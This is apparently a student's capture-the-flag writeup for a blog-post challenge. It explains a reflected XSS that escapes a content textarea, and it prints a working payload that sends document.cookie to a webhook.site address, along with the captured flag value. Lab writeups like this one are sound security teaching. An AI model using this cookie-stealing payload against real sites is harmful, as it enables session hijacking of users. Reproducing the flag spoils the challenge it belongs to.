# Challenge `Go on and censor my posts` Writeup

- Vulnerability: Reflected XSS attack

- Where: On the blogpost creation, content textarea

- Impact: Allows to execute code on the client's browser, and steal cookies for example.

- Note: It was told us that the feedback was shut down, and that now the necessary characters are escaped. SO it means that the traditional ways of XSS are'n allowed. But the content of the blogpodt creation is a textarea, so we can close the textarea, and execute a script right after. `</textarea><script>alert("Alguma coisa")</script>` is an example, and this will open a alert when creating or updating a post.
  

## Steps to reproduce

1. Create a website on [Webhook.site](https://webhook.site) and copy the URL of our fake website that will receive requests.
2. Create a blog post
3. Edit the post and use the same script that we used for the previous CTFs with the textarea close adition (`</textarea><script>location='https://webhook.site/<unique-id>/'+document.cookie</script>`)
4. On the [Webhook.site](https://webhook.site) dashboard, analyze the request, and there will be a GET request with `SECRET=SSof{I_do_not_get_this_Too_many_weird_characters_Automatic_reject}` that is the admin cookie (it might be needed to to a URL decode).

